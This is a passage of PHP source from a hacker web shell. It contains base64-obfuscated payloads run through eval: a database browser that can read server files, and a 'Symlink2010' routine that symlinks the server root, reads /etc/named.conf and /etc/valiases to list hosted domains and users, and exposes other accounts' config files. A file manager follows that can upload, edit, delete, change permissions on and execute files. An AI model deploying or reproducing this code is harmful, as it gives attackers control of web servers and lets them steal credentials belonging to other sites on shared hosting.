IGNsYXNzPW1haW4gPic7IAkJCQkJCSRsaW5lID0gMTsgCQkJCQkJd2hpbGUoJGl0ZW0gPSAkZGItPmZldGNoKCkpCXsgCQkJCQkJCWlmKCEkdGl0bGUpCXsgCQkJCQkJCQllY2hvICc8dHI+JzsgCQkJCQkJCQlmb3JlYWNoKCRpdGVtIGFzICRrZXkgPT4gJHZhbHVlKSAJCQkJCQkJCQllY2hvICc8dGg+Jy4ka2V5Lic8L3RoPic7IAkJCQkJCQkJcmVzZXQoJGl0ZW0pOyAJCQkJCQkJCSR0aXRsZT10cnVlOyAJCQkJCQkJCWVjaG8gJzwvdHI+PHRyPic7IAkJCQkJCQkJJGxpbmUgPSAyOyAJCQkJCQkJfSAJCQkJCQkJZWNobyAnPHRyIGNsYXNzPSJsJy4kbGluZS4nIj4nOyAJCQkJCQkJJGxpbmUgPSAkbGluZT09MT8yOjE7IAkJCQkJCQlmb3JlYWNoKCRpdGVtIGFzICRrZXkgPT4gJHZhbHVlKSB7IAkJCQkJCQkJaWYoJHZhbHVlID09IG51bGwpIAkJCQkJCQkJCWVjaG8gJzx0ZD48aT5udWxsPC9pPjwvdGQ+JzsgCQkJCQkJCQllbHNlIAkJCQkJCQkJCWVjaG8gJzx0ZD4nLm5sMmJyKGh0bWxzcGVjaWFsY2hhcnMoJHZhbHVlKSkuJzwvdGQ+JzsgCQkJCQkJCX0gCQkJCQkJCWVjaG8gJzwvdHI+JzsgCQkJCQkJfSAJCQkJCQllY2hvICc8L3RhYmxlPic7IAkJCQkJfSBlbHNlIHsgCQkJCQkJZWNobyAnPGRpdj48Yj5FcnJvcjo8L2I+ICcuaHRtbHNwZWNpYWxjaGFycygkZGItPmVycm9yKCkpLic8L2Rpdj4nOyAJCQkJCX0gCQkJCX0gCQkJCWVjaG8gIjxicj48L2Zvcm0+PGZvcm0gb25zdWJtaXQ9J2Quc2YucDEudmFsdWU9XCJxdWVyeVwiO2Quc2YucDIudmFsdWU9dGhpcy5xdWVyeS52YWx1ZTtkb2N1bWVudC5zZi5zdWJtaXQoKTtyZXR1cm4gZmFsc2U7Jz48dGV4dGFyZWEgbmFtZT0ncXVlcnknIHN0eWxlPSd3aWR0aDoxMDAlO2hlaWdodDoxMDBweCc+IjsgICAgICAgICAgICAgICAgIGlmKCFlbXB0eSgkX1BPU1RbJ3AyJ10pICYmICgkX1BPU1RbJ3AxJ10gIT0gJ2xvYWRmaWxlJykpICAgICAgICAgICAgICAgICAgICAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsncDInXSk7ICAgICAgICAgICAgICAgICBlY2hvICI8L3RleHRhcmVhPjxici8+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdFeGVjdXRlJz4iOyAJCQkJZWNobyAiPC90ZD48L3RyPiI7IAkJCX0gCQkJZWNobyAiPC90YWJsZT48L2Zvcm0+PGJyLz4iOyAgICAgICAgICAgICBpZigkX1BPU1RbJ3R5cGUnXT09J215c3FsJykgeyAgICAgICAgICAgICAgICAgJGRiLT5xdWVyeSgiU0VMRUNUIDEgRlJPTSBteXNxbC51c2VyIFdIRVJFIGNvbmNhdChgdXNlcmAsICdAJywgYGhvc3RgKSA9IFVTRVIoKSBBTkQgYEZpbGVfcHJpdmAgPSAneSciKTsgICAgICAgICAgICAgICAgIGlmKCRkYi0+ZmV0Y2goKSkgICAgICAgICAgICAgICAgICAgICBlY2hvICI8Zm9ybSBvbnN1Ym1pdD0nZC5zZi5wMS52YWx1ZT1cImxvYWRmaWxlXCI7ZG9jdW1lbnQuc2YucDIudmFsdWU9dGhpcy5mLnZhbHVlO2RvY3VtZW50LnNmLnN1Ym1pdCgpO3JldHVybiBmYWxzZTsnPjxzcGFuPkxvYWQgZmlsZTwvc3Bhbj4gPGlucHV0ICBjbGFzcz0ndG9vbHNJbnAnIHR5cGU9dGV4dCBuYW1lPWY+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSc+Pic+PC9mb3JtPiI7ICAgICAgICAgICAgIH0gCQkJaWYoQCRfUE9TVFsncDEnXSA9PSAnbG9hZGZpbGUnKSB7IAkJCQkkZmlsZSA9ICRkYi0+bG9hZEZpbGUoJF9QT1NUWydwMiddKTsgCQkJCWVjaG8gJzxwcmUgY2xhc3M9bWwxPicuaHRtbHNwZWNpYWxjaGFycygkZmlsZVsnZmlsZSddKS4nPC9wcmU+JzsgCQkJfSAJfSBlbHNlIHsgICAgICAgICBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJGRiLT5lcnJvcigpKTsgICAgIH0gCWVjaG8gJzwvZGl2Pic7";
eval(base64_decode($tkl));
exit;
case "Symlink2010":
$tkl = "QHNldF90aW1lX2xpbWl0KDApOyBAbWtkaXIoJ0hzSDEzMzcnLDA3NzcpOyAkSUlJSUlJSUlJSWwxICA9ICJPcHRpb25zIGFsbCBcbiBEaXJlY3RvcnlJbmRleCBDcm9vdC1Db2Rlci5odG1sIFxuIEFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIFxuIEFkZEhhbmRsZXIgc2VydmVyLXBhcnNlZCAucGhwIFxuICBBZGRUeXBlIHRleHQvcGxhaW4gLmh0bWwgXG4gQWRkSGFuZGxlciB0eHQgLmh0bWwgXG4gUmVxdWlyZSBOb25lIFxuIFNhdGlzZnkgQW55IjsgJElJSUlJSUlJSUkxSSA9QGZvcGVuICgnSHNIMTMzNy8uaHRhY2Nlc3MnLCd3Jyk7IGZ3cml0ZSgkSUlJSUlJSUlJSTFJICwkSUlJSUlJSUlJSWwxKTsgIGVjaG8gJyAgPGJyIC8+PGJyIC8+IDxmb3JtIG1ldGhvZD0icG9zdCI+IFVudHVrIE1lbWJ1a2EgU0MgbnlhIEZpbGUgQ29uZmlnIGRpIGxva2FzaSBDb25maWcgWWFuZyBGb3JiaWRlbnQ8YnIgLz4gPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZpbGUiIHZhbHVlPSIvaG9tZS9pc2ktdXNlci1jb3JiYW5ueWEvcHVibGljX2h0bWwvY29uZmlnLnBocCIgc2l6ZT0iNjAiLz4gPGJyPlN5bWxpbmsgTmFtZTxicj4gPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InN5bWZpbGUiIHZhbHVlPSJDcm9vdC1Db2Rlci50eHQiIHNpemU9IjYwIi8+PGJyIC8+PGJyIC8+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzeW1saW5rIiBuYW1lPSJzeW1saW5rIiAvPiA8YnIgLz48YnIgLz4gPC9mb3JtPiAnOyAkSUlJSUlJSUkxbElsID0gJF9QT1NUWydmaWxlJ107ICRzeW1maWxlID0gJF9QT1NUWydzeW1maWxlJ107ICRzeW1saW5rID0gJF9QT1NUWydzeW1saW5rJ107IGlmICgkc3ltbGluaykgeyBAc3ltbGluaygiJElJSUlJSUlJMWxJbCIsIkhzSDEzMzcvJHN5bWZpbGUiKTsgZWNobyAnPGJyIC8+PGEgdGFyZ2V0PSJfYmxhbmsiIGhyZWY9IkhzSDEzMzcvJy4kc3ltZmlsZS4nIiA+PT09PicuJHN5bWZpbGUuJzw9PT08L2E+JzsgfSAgQHN5bWxpbmsoJy8nLCdIc0gxMzM3L3Jvb3QnKTsgICRJSUlJSUlJSUlsbEkgPSBAZmlsZSgnL2V0Yy9uYW1lZC5jb25mJyk7IGlmKCEkSUlJSUlJSUlJbGxJKSB7IGRpZSAoIiBjYW4ndCByZWFkIC9ldGMvbmFtZWQuY29uZiIpOyB9IGVsc2UgeyAgICAgZWNobyAiPGRpdiBjbGFzcz0ndG1wJz48dGFibGUgIHdpZHRoPSc0MCUnPjx0ZD5Eb21haW5zPC90ZD48dGQ+VXNlcnMgJiBzeW1saW5rPC90ZD4iOyBmb3JlYWNoKCRJSUlJSUlJSUlsbEkgYXMgJElJSUlJSUlJSWxsMSl7IGlmKGVyZWdpKCd6b25lJywkSUlJSUlJSUlJbGwxKSl7IHByZWdfbWF0Y2hfYWxsKCcjem9uZSAiKC4qKSIjJywkSUlJSUlJSUlJbGwxLCRJSUlJSUlJSUlsMTEpOyBmbHVzaCgpOyBpZihzdHJsZW4odHJpbSgkSUlJSUlJSUlJbDExWzFdWzBdKSkgPjIpeyAkSUlJSUlJSUlJMUkxID0gcG9zaXhfZ2V0cHd1aWQoQGZpbGVvd25lcignL2V0Yy92YWxpYXNlcy8nLiRJSUlJSUlJSUlsMTFbMV1bMF0pKTsgJElJSUlJSUlJMUkxbCA9ICRJSUlJSUlJSUkxSTFbJ25hbWUnXSA7IEBzeW1saW5rKCcvJywnSHNIMTMzNy9yb290Jyk7ICRJSUlJSUlJSTFJMWwgPSAkSUlJSUlJSUlJbDExWzFdWzBdOyBlY2hvICIgPHRyPiA8dGQ+IDxkaXYgY2xhc3M9J2RvbSc+PGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9aHR0cDovL3d3dy4iLiRJSUlJSUlJSUlsMTFbMV1bMF0uIi8+Ii4kSUlJSUlJSUkxSTFsLiIgPC9hPiA8L2Rpdj4gPC90ZD4gPHRkPiA8YSBocmVmPSdIc0gxMzM3L3Jvb3QvaG9tZS8iLiRJSUlJSUlJSUkxSTFbJ25hbWUnXS4iL3B1YmxpY19odG1sJyB0YXJnZXQ9J19ibGFuayc+Ii4kSUlJSUlJSUlJMUkxWyduYW1lJ10uIjwvYT4gIDwvdGQ+IDwvdHI+PC9kaXY+ICI7IGZsdXNoKCk7IH0gfSB9IH0=";
eval(base64_decode($tkl));
exit;
}
}
function dirTKL ($dir) {
}
hidTKL ();
if (!$_GET['do'] == ''){
toolTKL ();
}
if ($_GET['do'] == 'Files'){
function getlist ($directory) {
	global $delim, $win;
	if ($d = @opendir($directory)) {
		while (($filename = @readdir($d)) !== false) {
			$path = $directory . $filename;
			if ($stat = @lstat($path)) {
				$file = array(
					'filename'    => $filename,
					'path'        => $path,
					'is_file'     => @is_file($path),
					'is_dir'      => @is_dir($path),
					'is_link'     => @is_link($path),
					'is_readable' => @is_readable($path),
					'is_writable' => @is_writable($path),
					'size'        => $stat['size'],
					'permission'  => $stat['mode'],
					'owner'       => $stat['uid'],
					'group'       => $stat['gid'],
					'mtime'       => @filemtime($path),
					'atime'       => @fileatime($path),
					'ctime'       => @filectime($path)
				);
				if ($file['is_dir']) {
					$file['is_executable'] = @file_exists($path . $delim . '.');
				} else {
					if (!$win) {
						$file['is_executable'] = @is_executable($path);
					} else {
						$file['is_executable'] = true;
					}
				}
				if ($file['is_link']) $file['target'] = @readlink($path);
				if (function_exists('posix_getpwuid')) $file['owner_name'] = @reset(posix_getpwuid($file['owner']));
				if (function_exists('posix_getgrgid')) $file['group_name'] = @reset(posix_getgrgid($file['group']));
				$files[] = $file;
			}
		}
		return $files;
	} else {
		return false;
	}
}
function sortlist (&$list, $key, $reverse) {
	quicksort($list, 0, sizeof($list) - 1, $key);
	if ($reverse) $list = array_reverse($list);
}
function quicksort (&$array, $first, $last, $key) {
	if ($first < $last) {
		$cmp = $array[floor(($first + $last) / 2)][$key];
		$l = $first;
		$r = $last;
		while ($l <= $r) {
			while ($array[$l][$key] < $cmp) $l++;
			while ($array[$r][$key] > $cmp) $r--;
			if ($l <= $r) {
				$tmp = $array[$l];
				$array[$l] = $array[$r];
				$array[$r] = $tmp;
				$l++;
				$r--;
			}
		}
		quicksort($array, $first, $r, $key);
		quicksort($array, $l, $last, $key);
	}
}
function permission_octal2string ($mode) {
	if (($mode & 0xC000) === 0xC000) {
		$type = 's';
	} elseif (($mode & 0xA000) === 0xA000) {
		$type = 'l';
	} elseif (($mode & 0x8000) === 0x8000) {
		$type = '-';
	} elseif (($mode & 0x6000) === 0x6000) {
		$type = 'b';
	} elseif (($mode & 0x4000) === 0x4000) {
		$type = 'd';
	} elseif (($mode & 0x2000) === 0x2000) {
		$type = 'c';
	} elseif (($mode & 0x1000) === 0x1000) {
		$type = 'p';
	} else {
		$type = '?';
	}
	$owner  = ($mode & 00400) ? 'r' : '-';
	$owner .= ($mode & 00200) ? 'w' : '-';
	if ($mode & 0x800) {
		$owner .= ($mode & 00100) ? 's' : 'S';
	} else {
		$owner .= ($mode & 00100) ? 'x' : '-';
	}
	$group  = ($mode & 00040) ? 'r' : '-';
	$group .= ($mode & 00020) ? 'w' : '-';
	if ($mode & 0x400) {
		$group .= ($mode & 00010) ? 's' : 'S';
	} else {
		$group .= ($mode & 00010) ? 'x' : '-';
	}
	$other  = ($mode & 00004) ? 'r' : '-';
	$other .= ($mode & 00002) ? 'w' : '-';
	if ($mode & 0x200) {
		$other .= ($mode & 00001) ? 't' : 'T';
	} else {
		$other .= ($mode & 00001) ? 'x' : '-';
	}
	return $type . $owner . $group . $other;
}
function is_script ($filename) {
	return ereg('\.php$|\.php3$|\.php4$|\.php5$', $filename);
}
function getmimetype ($filename) {
	static $mimes = array(
		'\.jpg$|\.jpeg$'  => 'image/jpeg',
		'\.gif$'          => 'image/gif',
		'\.png$'          => 'image/png',
		'\.html$|\.html$' => 'text/html',
		'\.txt$|\.asc$'   => 'text/plain',
		'\.xml$|\.xsl$'   => 'application/xml',
		'\.pdf$'          => 'application/pdf'
	);
	foreach ($mimes as $regex => $mime) {
		if (eregi($regex, $filename)) return $mime;
	}
	return 'text/plain';
}
function del ($file) {
	global $delim;
	if (!@is_link($file) && !file_exists($file)) return false;
	if (!@is_link($file) && @is_dir($file)) {
		if ($dir = @opendir($file)) {
			$error = false;
			while (($f = readdir($dir)) !== false) {
				if ($f != '.' && $f != '..' && !del($file . $delim . $f)) {
					$error = true;
				}
			}
			closedir($dir);
			if (!$error) return @rmdir($file);
			return !$error;
		} else {
			return false;
		}
	} else {
		return @unlink($file);
	}
}
function addslash ($directory) {
	global $delim;
	if (substr($directory, -1, 1) != $delim) {
		return $directory . $delim;
	} else {
		return $directory;
	}
}
function relative2absolute ($string, $directory) {
	if (path_is_relative($string)) {
		return simplify_path(addslash($directory) . $string);
	} else {
		return simplify_path($string);
	}
}
function path_is_relative ($path) {
	global $win;
	if ($win) {
		return (substr($path, 1, 1) != ':');
	} else {
		return (substr($path, 0, 1) != '/');
	}
}
function absolute2relative ($directory, $target) {
	global $delim;
	$path = '';
	while ($directory != $target) {
		if ($directory == substr($target, 0, strlen($directory))) {
			$path .= substr($target, strlen($directory));
			break;
		} else {
			$path .= '..' . $delim;
			$directory = substr($directory, 0, strrpos(substr($directory, 0, -1), $delim) + 1);
		}
	}
	if ($path == '') $path = '.';
	return $path;
}
function simplify_path ($path) {
	global $delim;
	if (@file_exists($path) && function_exists('realpath') && @realpath($path) != '') {
		$path = realpath($path);
		if (@is_dir($path)) {
			return addslash($path);
		} else {
			return $path;
		}
	}
	$pattern  = $delim . '.' . $delim;
	if (@is_dir($path)) {
		$path = addslash($path);
	}
	while (strpos($path, $pattern) !== false) {
		$path = str_replace($pattern, $delim, $path);
	}
	$e = addslashes($delim);
	$regex = $e . '((\.[^\.' . $e . '][^' . $e . ']*)|(\.\.[^' . $e . ']+)|([^\.][^' . $e . ']*))' . $e . '\.\.' . $e;
	while (ereg($regex, $path)) {
		$path = ereg_replace($regex, $delim, $path);
	}
	return $path;
}
function human_filesize ($filesize) {
	$suffices = 'kMGTPE';
	$n = 0;
	while ($filesize >= 1000) {
		$filesize /= 1024;
		$n++;
	}
	$filesize = round($filesize, 3 - strpos($filesize, '.'));
	if (strpos($filesize, '.') !== false) {
		while (in_array(substr($filesize, -1, 1), array('0', '.'))) {
			$filesize = substr($filesize, 0, strlen($filesize) - 1);
		}
	}
	$suffix = (($n == 0) ? '' : substr($suffices, $n - 1, 1));
	return $filesize . " {$suffix}B";
}
function strip (&$str) {
	$str = stripslashes($str);
}
function listing_page ($message = null) {
	global $self, $directory, $sort, $reverse;
	html_header();
	$list = getlist($directory);
	if (array_key_exists('sort', $_GET)) $sort = $_GET['sort']; else $sort = 'filename';
	if (array_key_exists('reverse', $_GET) && $_GET['reverse'] == 'true') $reverse = true; else $reverse = false;
	sortlist($list, $sort, $reverse);
	echo '
<form enctype="multipart/form-data" action="' . $self . '?do=Files" method="post">
<table id="main">
';
	directory_choice();
	if (!empty($message)) {
		spacer();
		echo $message;
	}
	if (@is_writable($directory)) {
		upload_box();
		create_box();
	} else {
		spacer();
	}
	if ($list) {
		listing($list);
	} else {
		echo error('not_readable', $directory);
	}
	echo '</table>
</form>
';
	html_footer();
}
function listing ($list) {
	global $directory, $homedir, $sort, $reverse, $win, $cols, $date_format, $self;
	echo '<tr class="listing">
	<th style="text-align: center; vertical-align: middle"></th>
';
	$d = 'do=Files&dir=' . urlencode($directory) . '&amp;';
	if (!$reverse && $sort == 'filename') $r = '&amp;reverse=true'; else $r = '';
	echo "\t<th class=\"filename\"><a href=\"$self?{$d}sort=filename$r\">" . word('filename') . "</a></th>\n";
	if (!$reverse && $sort == 'size') $r = '&amp;reverse=true'; else $r = '';
	echo "\t<th class=\"size\"><a href=\"$self?{$d}sort=size$r\">" . word('size') . "</a></th>\n";
	if (!$win) {
		if (!$reverse && $sort == 'permission') $r = '&amp;reverse=true'; else $r = '';
		echo "\t<th class=\"permission_header\"><a href=\"$self?{$d}sort=permission$r\">" . word('permission') . "</a></th>\n";
		if (!$reverse && $sort == 'owner') $r = '&amp;reverse=true'; else $r = '';
		echo "\t<th class=\"owner\"><a href=\"$self?{$d}sort=owner$r\">" . word('owner') . "</a></th>\n";
		if (!$reverse && $sort == 'group') $r = '&amp;reverse=true'; else $r = '';
		echo "\t<th class=\"group\"><a href=\"$self?{$d}sort=group$r\">" . word('group') . "</a></th>\n";
	}
	echo '	<th class="functions">' . word('functions') . '</th>
</tr>
';
	for ($i = 0; $i < sizeof($list); $i++) {
		$file = $list[$i];
		$timestamps  = 'mtime: ' . date($date_format, $file['mtime']) . ', ';
		$timestamps .= 'atime: ' . date($date_format, $file['atime']) . ', ';
		$timestamps .= 'ctime: ' . date($date_format, $file['ctime']);
		echo '<tr class="listing">
	<td class="checkbox"><input type="checkbox" name="checked' . $i . '" value="true" onfocus="activate(\'other\')" /></td>
	<td class="filename" title="' . html($timestamps) . '">';
		if ($file['is_link']) {
	
			echo html($file['filename']) . ' &rarr; ';
			$real_file = relative2absolute($file['target'], $directory);
			if (@is_readable($real_file)) {
				if (@is_dir($real_file)) {
					echo '[ <a href="' . $self . '?do=Files&dir=' . urlencode($real_file) . '">' . html($file['target']) . '</a> ]';
				} else {
					echo '<a href="' . $self . '?do=Files&action=view&amp;file=' . urlencode($real_file) . '">' . html($file['target']) . '</a>';
				}
			} else {
				echo html($file['target']);
			}
		} elseif ($file['is_dir']) {
			echo ' [ ';
			if ($win || $file['is_executable']) {
				echo '<a href="' . $self . '?do=Files&dir=' . urlencode($file['path']) . '">' . html($file['filename']) . '</a>';
			} else {
				echo html($file['filename']);
			}
			echo ' ]';
		} else {
			if (substr($file['filename'], 0, 1) == '.') {
				echo '';
			} else {
				echo '';
			}
			if ($file['is_file'] && $file['is_readable']) {
			   echo '<a href="' . $self . '?do=Files&action=view&amp;file=' . urlencode($file['path']) . '">' . html($file['filename']) . '</a>';
			} else {
				echo html($file['filename']);
			}
		}
		if ($file['size'] >= 1000) {
			$human = ' title="' . human_filesize($file['size']) . '"';
		} else {
			$human = '';
		}
		echo "\t<td class=\"size\"$human>{$file['size']} B</td>\n";
		if (!$win) {
			echo "\t<td class=\"permission\" title=\"" . decoct($file['permission']) . '">';
			$l = !$file['is_link'] && (!function_exists('posix_getuid') || $file['owner'] == posix_getuid());
			if ($l) echo '<a href="' . $self . '?do=Files&action=permission&amp;file=' . urlencode($file['path']) . '&amp;dir=' . urlencode($directory) . '">';
			echo html(permission_octal2string($file['permission']));
			if ($l) echo '</a>';
			echo "</td>\n";
			if (array_key_exists('owner_name', $file)) {
				echo "\t<td class=\"owner\" title=\"uid: {$file['owner']}\">{$file['owner_name']}</td>\n";
			} else {
				echo "\t<td class=\"owner\">{$file['owner']}</td>\n";
			}
			if (array_key_exists('group_name', $file)) {
				echo "\t<td class=\"group\" title=\"gid: {$file['group']}\">{$file['group_name']}</td>\n";
			} else {
				echo "\t<td class=\"group\">{$file['group']}</td>\n";
			}
		}
		echo '	<td class="functions">
		<input type="hidden" name="file' . $i . '" value="' . html($file['path']) . '" />
';
		$actions = array();
		if (function_exists('symlink')) {
			$actions[] = 'create_symlink';
		}
		if (@is_writable(dirname($file['path']))) {
			$actions[] = 'delete';
			$actions[] = 'rename';
			$actions[] = 'move';
		}
		if ($file['is_file'] && $file['is_readable']) {
			$actions[] = 'copy';
			$actions[] = 'download';
			if ($file['is_writable']) $actions[] = 'edit';
		}
		if (!$win && function_exists('exec') && $file['is_file'] && $file['is_executable'] && file_exists('/bin/sh')) {
			$actions[] = 'execute';
		}
		if (sizeof($actions) > 0) {
			echo '		<select class="small" name="action' . $i . '" size="1">
		<option value="">' . str_repeat('&nbsp;', 30) . '</option>
';
			foreach ($actions as $action) {
				echo "\t\t<option value=\"$action\">" . word($action) . "</option>\n";
			}
			echo '		</select>
		<input class="small" type="submit" name="submit' . $i . '" value=" &gt; " onfocus="activate(\'other\')" />
';
		}
		echo '	</td>
</tr>
';
	}
	echo '<tr class="listing_footer">
	<td style="text-align: right; vertical-align: top"></td>
	<td colspan="' . ($cols - 1) . '">
		<input type="hidden" name="num" value="' . sizeof($list) . '" />
		<input type="hidden" name="focus" value="" />
		<input type="hidden" name="olddir" value="' . html($directory) . '" />
';
	$actions = array();
	if (@is_writable(dirname($file['path']))) {
		$actions[] = 'delete';
		$actions[] = 'move';
	}
	$actions[] = 'copy';
	echo '		<select class="small" name="action_all" size="1">
		<option value="">' . str_repeat('&nbsp;', 30) . '</option>
';
	foreach ($actions as $action) {
		echo "\t\t<option value=\"$action\">" . word($action) . "</option>\n";
	}
	echo '		</select>
		<input class="small" type="submit" name="submit_all" value=" &gt; " onfocus="activate(\'other\')" />
	</td>
</tr>
';
}
function directory_choice () {
	global $directory, $homedir, $cols, $self;
	echo '<tr>
	<td colspan="' . $cols . '" id="directory">
		<a href="' . $self . '?do=Files&dir=' . urlencode($homedir) . '">' . word('directory') . '</a>:
		<input type="text" name="dir" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" onfocus="activate(\'directory\')" />
		<input type="submit" name="changedir" value="' . word('change') . '" onfocus="activate(\'directory\')" />
	</td>
</tr>
';
}
function upload_box () {
	global $cols;
	echo '<tr>
	<td colspan="' . $cols . '" id="upload">
		' . word('file') . ':
		<input type="file" name="upload" onfocus="activate(\'other\')" />
		<input type="submit" name="submit_upload" value="' . word('upload') . '" onfocus="activate(\'other\')" />
	</td>
</tr>
';
}
function create_box () {
	global $cols;
	echo '<tr>
	<td colspan="' . $cols . '" id="create">
		<select name="create_type" size="1" onfocus="activate(\'create\')">
		<option value="file">' . word('file') . '</option>
		<option value="directory">' . word('directory') . '</option>
		</select>
		<input type="text" name="create_name" onfocus="activate(\'create\')" />
		<input type="submit" name="submit_create" value="' . word('create') . '" onfocus="activate(\'create\')" />
	</td>
</tr>
';
}
function edit ($file) {
	global $self, $directory, $editcols, $editrows, $apache, $htpasswd, $htaccess;
	html_header();
	echo '<h2 style="margin-bottom: 3pt">' . html($file) . '</h2>
<form action="' . $self . '?do=Files" method="post">
<table class="dialog">
<tr>
<td class="dialog">
	<textarea name="content" cols="' . $editcols . '" rows="' . $editrows . '" WRAP="off">';
	if (array_key_exists('content', $_POST)) {
		echo $_POST['content'];
	} else {
		$f = fopen($file, 'r');
		while (!feof($f)) {
			echo html(fread($f, 8192));
		}
		fclose($f);
	}
	if (!empty($_POST['user'])) {
		echo "\n" . $_POST['user'] . ':' . crypt($_POST['password']);
	}
	if (!empty($_POST['basic_auth'])) {
		if ($win) {
			$authfile = str_replace('\\', '/', $directory) . $htpasswd;
		} else {
			$authfile = $directory . $htpasswd;
		}
		echo "\nAuthType Basic\nAuthName &quot;Restricted Directory&quot;\n";
		echo 'AuthUserFile &quot;' . html($authfile) . "&quot;\n";
		echo 'Require valid-user';
	}
	echo '</textarea>
	<hr />
';
	if ($apache && basename($file) == $htpasswd) {
		echo '
	' . word('user') . ': <input type="text" name="user" />
	' . word('password') . ': <input type="password" name="password" />
	<input type="submit" value="' . word('add') . '" />
	<hr />
';
	}
	if ($apache && basename($file) == $htaccess) {
		echo '
	<input type="submit" name="basic_auth" value="' . word('add_basic_auth') . '" />
	<hr />
';
	}
	echo '
	<input type="hidden" name="action" value="edit" />
	<input type="hidden" name="file" value="' . html($file) . '" />
	<input type="hidden" name="dir" value="' . html($directory) . '" />
	<input type="reset" value="' . word('reset') . '" id="red_button" />
	<input type="submit" name="save" value="' . word('save') . '" id="green_button" style="margin-left: 50px" />
</td>
</tr>
</table>
<p><a href="' . $self . '?do=Files&dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
</form>
';
	html_footer();
}
function spacer () {
	global $cols;
	echo '<tr>
	<td colspan="' . $cols . '" style="height: 1em"></td>
</tr>
';
}
function textfieldsize ($content) {
	$size = strlen($content) + 5;
	if ($size < 30) $size = 30;
	return $size;
}
function request_dump () {
	foreach ($_REQUEST as $key => $value) {
		echo "\t<input type=\"hidden\" name=\"" . html($key) . '" value="' . html($value) . "\" />\n";
	}
}
function html ($string) {
	global $charset;
	return htmlentities($string, ENT_COMPAT, $charset);
}
function word ($word) {
	global $words, $word_charset;
	return htmlentities($words[$word], ENT_COMPAT, $word_charset);
}
function phrase ($phrase, $arguments) {
	global $words;
	static $search;
	if (!is_array($search)) for ($i = 1; $i <= 8; $i++) $search[] = "%$i";
	for ($i = 0; $i < sizeof($arguments); $i++) {
		$arguments[$i] = nl2br(html($arguments[$i]));
	}
	$replace = array('{' => '<pre>', '}' =>'</pre>', '[' => '<b>', ']' => '</b>');
	return str_replace($search, $arguments, str_replace(array_keys($replace), $replace, nl2br(html($words[$phrase]))));
}
function getwords ($lang) {
	global $word_charset, $date_format;
	switch ($lang) {
	case 'en':
	default:
		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';
		return array(
'directory' => 'Directory',
'file' => 'File',
'filename' => 'Filename',
'size' => 'Size',
'permission' => 'Permission',
'owner' => 'Owner',
'group' => 'Group',
'other' => 'Others',
'functions' => 'Functions',
'read' => 'read',
'write' => 'write',
'execute' => 'execute',
'create_symlink' => 'create symlink',
'delete' => 'delete',
'rename' => 'rename',
'move' => 'move',
'copy' => 'copy',
'edit' => 'edit',
'download' => 'download',
'upload' => 'upload',
'create' => 'create',
'change' => 'change',
'save' => 'save',
'set' => 'set',
'reset' => 'reset',
'relative' => 'Relative path to target',
'yes' => 'Yes',
'no' => 'No',
'back' => 'back',
'destination' => 'Destination',
'symlink' => 'Symlink',
'no_output' => 'no output',
'user' => 'User',
'password' => 'Password',
'add' => 'add',
'add_basic_auth' => 'add basic-authentification',
'uploaded' => '"[%1]" has been uploaded.',
'not_uploaded' => '"[%1]" could not be uploaded.',
'already_exists' => '"[%1]" already exists.',
'created' => '"[%1]" has been created.',
'not_created' => '"[%1]" could not be created.',
'really_delete' => 'Delete these files?',
'deleted' => "These files have been deleted:\n[%1]",
'not_deleted' => "These files could not be deleted:\n[%1]",
'rename_file' => 'Rename file:',
'renamed' => '"[%1]" has been renamed to "[%2]".',
'not_renamed' => '"[%1] could not be renamed to "[%2]".',
'move_files' => 'Move these files:',
'moved' => "These files have been moved to \"[%2]\":\n[%1]",
'not_moved' => "These files could not be moved to \"[%2]\":\n[%1]",
'copy_files' => 'Copy these files:',
'copied' => "These files have been copied to \"[%2]\":\n[%1]",
'not_copied' => "These files could not be copied to \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" can not be edited.',
'executed' => "\"[%1]\" has been executed successfully:\n{%2}",
'not_executed' => "\"[%1]\" could not be executed successfully:\n{%2}",
'saved' => '"[%1]" has been saved.',
'not_saved' => '"[%1]" could not be saved.',
'symlinked' => 'Symlink from "[%2]" to "[%1]" has been created.',
'not_symlinked' => 'Symlink from "[%2]" to "[%1]" could not be created.',
'permission_for' => 'Permission of "[%1]":',
'permission_set' => 'Permission of "[%1]" was set to [%2].',
'permission_not_set' => 'Permission of "[%1]" could not be set to [%2].',
'not_readable' => '"[%1]" can not be read.'
		);
	}
}
function getimage ($image) {
	
}
function html_header () {
	

}
function html_footer () {
	echo <<<END
</body>
</html>
END;
}
function notice ($phrase) {
	global $cols;
	$args = func_get_args();
	array_shift($args);
	return '<tr id="notice"><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p><p>
	<td colspan="' . $cols . '">' . phrase($phrase, $args) . '</td>
</tr>
';
}
function error ($phrase) {
	global $cols;
	$args = func_get_args();
	array_shift($args);
	return '<tr id="error">
	<td colspan="' . $cols . '">' . phrase($phrase, $args) . '</td>
</tr>
';
}


////
$homedir = './';
if (get_magic_quotes_gpc()) {
	array_walk($_GET, 'strip');
	array_walk($_POST, 'strip');
	array_walk($_REQUEST, 'strip');
}
if (array_key_exists('image', $_GET)) {
	header('Content-Type: image/gif');
	die(getimage($_GET['image']));
}
$delim = DIRECTORY_SEPARATOR;
if (function_exists('php_uname')) {
	$win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
} else {
	$win = ($delim == '\\') ? true : false;
}
if (!empty($_SERVER['PATH_TRANSLATED'])) {
	$scriptdir = dirname($_SERVER['PATH_TRANSLATED']);
} elseif (!empty($_SERVER['SCRIPT_FILENAME'])) {
	$scriptdir = dirname($_SERVER['SCRIPT_FILENAME']);
} elseif (function_exists('getcwd')) {
	$scriptdir = getcwd();
} else {
	$scriptdir = '.';
}
$homedir = relative2absolute($homedir, $scriptdir);

$dir = (array_key_exists('dir', $_REQUEST)) ? $_REQUEST['dir'] : $homedir;

